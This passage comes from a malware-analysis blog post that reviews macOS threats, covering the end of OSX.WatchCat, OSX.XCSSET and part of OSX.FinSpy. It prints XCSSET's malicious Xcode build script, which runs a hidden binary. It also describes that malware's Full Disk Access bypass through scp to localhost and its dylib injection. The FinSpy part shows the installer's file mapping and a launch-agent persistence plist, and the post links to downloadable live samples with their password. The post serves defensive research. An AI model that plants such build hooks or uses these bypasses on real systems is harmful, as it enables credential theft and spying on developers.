</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_60 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">56</span>A2001E<span style="color:#960050;background-color:#1e0010">&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    var_60 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>T1B7D952<span style="color:#960050;background-color:#1e0010">&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    var_A4 <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    rax <span style="color:#f92672">=</span> SendRawData(_g_HttpSetting, ..., <span style="color:#f92672">&amp;</span>var_60, <span style="color:#f92672">&amp;</span>var_A4, <span style="color:#ae81ff">0x4</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>            rax <span style="color:#f92672">=</span> RecvRawData(<span style="color:#f92672">&amp;</span>var_80, <span style="color:#ae81ff">0x4</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>            <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>                    __sprintf_chk(<span style="color:#f92672">&amp;</span>var_A0, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#34;%04d&#34;</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_g_nBoardID);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>                    rax <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">&amp;</span>var_A0, <span style="color:#f92672">&amp;</span>var_80);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>                    rbx <span style="color:#f92672">=</span> rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>}</span></span></code></pre></div>
<div class="note">
<p>For more details on OSX.WatchCat and other similar (and recent) Lazarus Group backdoors, see Phil&rsquo;s writeup:</p>
<center>
  "<a class="inlineLink" href="https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/">Four Distinct Families of Lazarus Malware Target Apple‚Äôs macOS Platform</a>"
</center>
</div>
<br>
<h3 id="-osxxcsset">üëæ <code>OSX.XCSSET</code></h3>
<div class="note">
<p>XCSSET is rather unique, as it targets macOS developers (Xcode users) and leverages several 0days to steal passwords and exfiltrate data.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/XCSSET.zip"><code>OSX.XCSSET</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In July, I noticed that Apple&rsquo;s XProtect update (v. 2126) had added a new signature for a sample Cupertino named <code>MACOS.2070d41</code>:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Apple&#39;s XProtect update (v2126) contains a new signature: &quot;MACOS.2070d41&quot;<br><br>Looks for compiled AppleScript, w/ strings such as &quot;curl --connect-timeout 10 -ks -d&quot; <br><br>0 hits on <a href="https://twitter.com/virustotal?ref_src=twsrc%5Etfw">@virustotal</a> :( <a href="https://twitter.com/AppleSupport?ref_src=twsrc%5Etfw">@AppleSupport</a>, can you share info/hashes w/ others looking to help protect macOS users? üôÉ <a href="https://t.co/LQhxeqmT3z">pic.twitter.com/LQhxeqmT3z</a></p>&mdash; patrick wardle (@patrickwardle) <a href="https://twitter.com/patrickwardle/status/1282860187397746689?ref_src=twsrc%5Etfw">July 14, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>&hellip;in wasn&rsquo;t till August, when TrendMicro researchers released their <a href="https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/">report</a> on (and IoCs for) <code>OSX.XCSSET</code> that we learned more about this intriguing malware.</p>
<blockquote>
"We have discovered an unusual infection related to Xcode developer projects. Upon further investigation, we discovered that a developer‚Äôs Xcode project at large contained the source malware [OSX.XCSSET], which leads to a rabbit hole of malicious payloads." -TrendMicro
</blockquote>
<br>
<div class="note">
<p>TrendMicro&rsquo;s technical analysis of OSX.XCSSET is incredibly detailed and thorough. If you&rsquo;re interested in more details about this malware, it&rsquo;s a must read:</p>
<center>
  "<a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf" class="inlineLink">XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day Exploitss</a>"
</center>
</div>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/">&ldquo;Mac malware exposed: XCSSET, an advanced new threat&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/">&ldquo;What is OSX.XCSSET malware and what should I do about it?&rdquo;</a></p>
</li>
<li>
<p><a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf">&ldquo;XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day Exploits&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> (user-downloaded) Xcode Projects</span></p>
<p>Xcode is the de-facto IDE for developing software for Apple devices (iOS, macOS, etc.). It appears that <code>OSX.XCSSET</code> was originally discovered hiding within various developer&rsquo;s Xcode projects. Several of these infected projects were found/hosted online (on Github).</p>
<p>If an XCSSET-infected Xcode project is downloaded and built, the malicious code will be automatically run and the developer‚Äôs Mac will be infected.</p>
<p>TrendMicro explains:</p>
<blockquote>
"This threat primarily spreads via Xcode projects... It is not yet clear how the threat initially enters these systems. Presumably, these systems would be primarily used by developers. These Xcode projects have been modified such that upon building, these projects would run a malicious code. 
<br>
<br>
This eventually leads to the main XCSSET malware being dropped and run on the affected system. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen." -TrendMicro
</blockquote>
<p>Examining an Xcode project infected with <code>OSX.XCSSET</code>, reveals a script in the project‚Äôs <code>project.pbxproj</code> file that executes another script (<code>Assets.xcassets</code>) from a hidden directory (<code>.xcassets/</code>):</p>
<img src="../images/blog/blog_0x5F/xsXcode.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">malicious build script in an OSX.XCSSET-infected Xcode project</center>

<p>Taking a peek at this <code>Assets.xcassets</code> script, reveals it executes a binary named <code>xcassets</code> &hellip;which is the core component of the malware:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>cd <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PROJECT_FILE_PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/xcuserdata/.xcassets/&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>xattr -c <span style="color:#e6db74">&#34;xcassets&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>chmod +x <span style="color:#e6db74">&#34;xcassets&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>./xcassets <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PROJECT_FILE_PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> true%</span></span></code></pre></div>
<p>As noted, building the infected project will trigger the execution of the script(s).
<br></p>
<div class="note">
<p>For readers interested in the specifics of OSX.XCSSET&rsquo;s Xcode project subversion (infection), see TrendMicro&rsquo;s report (pp. 1-4):</p>
<center>
  "<a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf" class="inlineLink">XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day Exploitss</a>"
</center>
</div>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> None(?)</span>
</p>
<p>It appears that <code>OSX.XCSET</code> does not persist, but rather relies on the user triggering both the initial infection and (subsequent) re-executions of the malware &hellip;for example building an infected Xcode project, or running one of the applications it modifies.</p>
<p>However, due to the primary goals of the malware (credential stealing and file exfiltration), there may be no need, nor advantage, to the malware persisting.</p>
<p>In terms of application modifications (which can lead to &ldquo;persistence&rdquo; via user interactions), <code>OSX.XCSSET</code> modifies (references) Safari (not the actual <code>Safari.app</code> which would invalidate the code signature).</p>
<p>The TrendMicro <a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf">report</a> notes:</p>
<blockquote>
"This is done so that when the infected user wants to open the normal Safari browser, the fake one will get executed instead.
<br> 
<br>
...functionally, this means that the fake Safari browser runs instead of the legitimate version of Safari." -TrendMicro
</blockquote>
<p>It should also be noted that several of the malware&rsquo;s modules reference launch agent property lists &hellip;property lists that are likely related to the malware. For example (as noted by TrendMicro) the <code>remove_old</code> module, &ldquo;<em>removes &hellip; <code>~/Library/LaunchAgents/com.apple.core.launchd.plist</code></em>&rdquo; while the <code>cleaner</code> module &ldquo;<em>removes <code>~/Library/LaunchAgents/com.apple.core.accountsd.plist</code></em>&rdquo;</p>
<p>&hellip;thus some versions/variants of the <code>OSX.XCSSET</code> may persist via normal mechanisms (e.g. launch agents).</p>
<br>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Credential Stealing, Data Exfiltration, Ransomware, Viral Replication ...and more!
</span>
</p>
One of the main goals of `OSX.XCSSET` is to steal credentials and exfiltrate data from user applications. 
<p>A <a href="https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/">writeup</a> by Intego notes:</p>
<blockquote>
"XCSSET attempts to steal passwords from victims‚Äô Apple ID, Google, Paypal, and other accounts.
...[the malware] also attempts to exfiltrate data from apps such as Apple Notes, Evernote, Skype, Telegram, and WeChat" -Intego
</blockquote>
<p>It should be noted that on recent versions of macOS, malware is are prevented from accessing various user/system files, unless the user has manually granted the application &ldquo;Full Disk Access&rdquo; (via the System Preferences application).</p>
<p>To work around this privacy mechanism, <code>OSX.XCSSET</code> leverages (what were) two 0day exploits:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Exploit 0x1: <br>...bypass Full Disk Access via SSHD to access (protected) Safari cookies üç™ <a href="https://t.co/NW4mfStmzh">pic.twitter.com/NW4mfStmzh</a></p>&mdash; patrick wardle (@patrickwardle) <a href="https://twitter.com/patrickwardle/status/1294167251008942081?ref_src=twsrc%5Etfw">August 14, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>The first vulnerability (implemented in the malware&rsquo;s <code>safari_cookie</code> module) abuses the fact that Full Disk Access is granted to the <code>ssh</code> service. The malware simply (ab)uses <code>scp</code> to &ldquo;connect&rdquo; to the system it&rsquo;s running on (<code>username@localhost</code>) and copy protected files (e.g. Safari&rsquo;s binary cookie file).</p>
<div class="note">
For more details on this exploit, see 
<br><br>
<center>
  "<a class="inlineLink" href="https://eclecticlight.co/2020/08/20/the-vulnerability-in-remote-login-ssh-persists/">The vulnerability in Remote Login (ssh) persists</a>".
</center>
</div>
<p>The second vulnerability involves leverages <code>SafariForWebKitDevelopment</code>:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Also, Dylib Hijacking!? üòç <a href="https://t.co/jk48UmystT">pic.twitter.com/jk48UmystT</a></p>&mdash; patrick wardle (@patrickwardle) <a href="https://twitter.com/patrickwardle/status/1294168301510119425?ref_src=twsrc%5Etfw">August 14, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>As noted in a Jamf <a href="https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/">writeup</a> on the malware:</p>
<blockquote>
"The second exploit leverages a developer specific tool. If the device doesn‚Äôt already have the SafariForWebKitDevelopment component installed, the malware goes and downloads it. With this, it can utilize Safari‚Äôs extensive capabilities without being hindered by the usual sandbox." -Jamf
</blockquote>
<p>&hellip;in order to gain code execution within the context of Apple&rsquo;s <code>SafariForWebKitDevelopment</code> binary, the malware (ab)uses the <code>DYLD_FRAMEWORK_PATH</code> and <code>DYLD_LIBRARY_PATH</code> environment variables:</p>
<img src="../images/blog/blog_0x5F/xsDylib.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX.XCSSET&#39;s dylib injection (credit: TrendMicro)</center>

<p>Once loaded within the (developer version of) Safari, the malicious code (JavaScript) can be downloaded and executed without being constrained by normal browser restrictions. This allows it manipulate browser results, as well as steal credentials from various sites of interest.</p>
<p>The combination of these two exploits is rather potent, and allows <code>OSX.XCSSet</code> perform its credential stealing and data exfiltration actions quite effectively:</p>
<blockquote>
"XCSSet effectively has all the tools it needs to run arbitrary code and touch every file on the system, neatly sidestepping the strong defenses in macOS." -Jamf
</blockquote>
<br>
<div class="note">
<p>And what if the user doesn&rsquo;t have Safari? Well as Intego notes:</p>
<p>&ldquo;And just in case the victim doesn‚Äôt use Safari, XCSSET also has the capability of installing Trojanized versions of many other Mac browsers: Google Chrome, Mozilla Firefox, Microsoft Edge, Brave, Opera, 360 (a Chinese browser), and Yandex (a Russian browser).&rdquo;</p>
</div>
<p>Besides credential / data stealing, <code>OSX.XCSSET</code> supports a myriad of other capabilities (implemented via payload modules). The TrendMicro <a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf">report</a> summarizes the plugins (and their capabilities). Some notable plugins, mentioned in the report include:</p>
<ul>
<li>
<p><code>screen</code>: <br>
Takes screenshots of an infected system.</p>
</li>
<li>
<p><code>encrypter</code>: <br>
Encrypts (ransoms) users files (via AES in CBC mode).</p>
</li>
<li>
<p><code>replicator</code>: <br>
Infects local Xcode projects with its malicious code.</p>
</li>
</ul>
<br>
<h3 id="-osxfinspy">üëæ <code>OSX.FinSpy</code></h3>
<div class="note">
<p>FinSpy is commercial cross-platform implant, supporting a myriad of cyber espionage features &amp; capabilities.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/FinSpy.zip"><code>OSX.FinSpy</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>The malware was discovered by Amnesty International, as seen in the tweet by <a href="https://twitter.com/botherder">Claudio Guarnieri</a>, their &ldquo;Head of Security Lab&rdquo;:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Sometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed on a webserver. So here ya go, along with recent Windows and Android, we&#39;re publishing details on new FinFisher for Mac OS üçé and Linux üêß.<a href="https://t.co/eakdBWcYbF">https://t.co/eakdBWcYbF</a></p>&mdash; nex (@botherder@mastodon.social) (@botherder) <a href="https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw">September 25, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Titled, &ldquo;<a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed</a>,&rdquo; the Amnesty International writeup detailed FinFisher&rsquo;s spyware suite (FinSpy), including &ldquo;<em>previously undisclosed versions for Linux and MacOS computers&rdquo;</em></p>
<p>As noted in their report:</p>
<blockquote>
"FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers have documented numerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, and dissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE, and more."
</blockquote>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://objective-see.com/blog/blog_0x4F.html">&ldquo;FinFisher Filleted üêü&rdquo;</a></p>
</li>
<li>
<p><a href="https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/">&ldquo;The Finfisher Tales, Chapter 1: The dropper&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">&ldquo;German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>Amnesty International uncovered &ldquo;<em>a server located at the IP address 158.69.105[.]207</em>&rdquo; &hellip;hosting various FinSpy samples, including a macOS variant:</p>
<img src="../images/blog/blog_0x5F/ffServer.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">FinSpy Server  (credit: Amnesty International) </center>

<p>Unfortunately there was no clear indication how (macOS) targets were infected.</p>
<div class="note">
<p>Commercial spyware is often sold to customers, who are then responsible for figuring out how to deploy the software to (read: infect) targets of interest.</p>
<p>Such customers may (separately) purchase exploits, or craft their own social engineering campaigns to compromise their targets.</p>
</div>
<p>However, we should note that the malware was distributed as disk image, containing a single item: an application bundle named <code>Install CÃßagÃÜlayan</code>:</p>
<img src="../images/blog/blog_0x4F/dmg.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app</center>

<p>&hellip;with a bundle identifier of <code>com.coverpage.bluedome.caglayan.desktop.installer</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ cat "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/Info.plist"

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
    &lt;dict&gt;
        
        &lt;key&gt;CFBundleExecutable&lt;/key&gt;
        &lt;string&gt;Install &Ccedil;aƒülayan&lt;/string&gt;
        
        &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
        &lt;string&gt;<b>com.coverpage.bluedome.caglayan.desktop.installer</b>&lt;/string&gt;
        ...
    &lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div>
<p>This may indicate that the malware was distributed as a trojanized application or perhaps was attempting to masquerade as a legitimate application (perhaps for the Turkish news(?) site, CÃßagÃÜlayan (<code>caglayandergisi.com</code>)).</p>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Agent</span>
</p>
<p>If the malicious application (<code>Install CÃßagÃÜlayan.app</code>) is run, it will eventually execute an installer (that was copied to <code>~/Library/Caches/org.logind.ctp.archive/installer</code>).</p>
<p>As noted in the Amnesty <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>, this installer performs three actions:</p>
<ol>
<li>Copies plugins and config files to <code>/Library/Frameworks/Storage.framework</code>.</li>
<li>Copies the launcher (<code>logind</code>) to <code>/private/etc/logind</code>.</li>
<li>Persists the launcher, by creating a launch agent plist: <code>/System/Library/LaunchAgents/logind.pslist</code>.</li>
</ol>
<p>Let&rsquo;s take a closer look at it now, to highlight the code responsible for these actions.</p>
<p>The <code>org.logind.ctp.archive/installer</code> is a Mach-O binary, rather similar (albeit simpler) than its parent, <code>.log/ARA0848.app/Contents/MacOS/installer</code>. (For example, both contain a custom <code>GIFileOps</code> class that implements various file related methods (<code>copy: to:</code>, <code>loadAgent</code>, etc.).</p>
<p>This (next stage) installer&rsquo;s main method starts at <code>0x000000010a3d95ac</code>. The logic the the <code>main</code> function first checks for the presence of various files (plugins?), such as <code>/Library/Frameworks/Storage.framework</code>, <code>/Contents/Resources/7f.bundle/Contents/Resources/AAC.dat</code>. It then builds a dictionary of key-value pairs via a call to <code>[GIPath installationMap]</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb org.logind.ctp.archive/installer

...
* thread #1, queue = 'com.apple.main-thread'
installer`main:
->  0x10a3da37e <+3538>: callq  *0x6d04(%rip) ;objc_msgSend

(lldb) x/s $rsi
0x10a3df5c7: "<b>installationMap</b>"

(lldb) ni

(lldb) po $rax
{
    "/Users/user/Library/Caches/org.logind.ctp.archive/Storage.framework"
     ‚Üí "/Library/Frameworks/Storage.framework";

    "/Users/user/Library/Caches/org.logind.ctp.archive/logind"
     ‚Üí "/private/etc/logind";

    "/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext"
     ‚Üí "/System/Library/Extensions/logind.kext";
    
    "/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist"
     ‚Üí "/Library/LaunchAgents/logind.plist";
}

</pre>
</div>
<p>As we can see in the debugger output, this maps files from the decrypted uncompressed archive (<code>org.logind.ctp.archive</code>) to their final destinations.</p>
<p>The installer then iterates over each of these files, and via a block (at <code>0x000000010a3da4d2</code>) moves them from the archive to their (final) destinations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>files <span style="color:#f92672">=</span> [GIPath installationMap];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>[files enumerateKeysAndObjectsUsingBlock:(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">^</span>)(KeyType src, ObjectType dest, BOOL <span style="color:#f92672">*</span>stop))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>   [GIFileOps move:src to:dest];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>   [GIFileOps setStandardAttributes:dest];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}];</span></span></code></pre></div>
<p>We can passively observe this via our <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter installer
{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/Library/LaunchAgents/logind.plist",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/private/etc/logind",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/System/Library/Extensions/logind.kext",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/Library/Frameworks/Storage.framework",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/storage.framework"
  }
}

</pre>
</div></p>
<p>Let&rsquo;s take a closer look at the <code>logind.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ cat /Library/LaunchAgents/logind.plist

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
        &lt;key&gt;Label&lt;/key&gt;
        &lt;string&gt;org.logind&lt;/string&gt;
        &lt;key&gt;ProgramArguments&lt;/key&gt;
        &lt;array&gt;
                &lt;string&gt;<b>/private/etc/logind</b>&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;RunAtLoad&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;KeepAlive&lt;/key&gt;
        &lt;dict&gt;
                &lt;key&gt;SuccessfulExit&lt;/key&gt;
                &lt;false/&gt;
        &lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code>, the binary, <code>/private/etc/logind</code> will be automatically (re)executed each time the system is rebooted an the user logs in.</p>
<p>Once the installer has, well, installed (and setuid&rsquo;d) these various components, it kicks off this persistent launch agent via a call to <code>[GIFileOps loadAgent:]</code></p>
<p>This method simply invokes <code>launchctl</code> with the <code>load</code> command line argument, and path to the <code>logind.plist</code> to:</p>
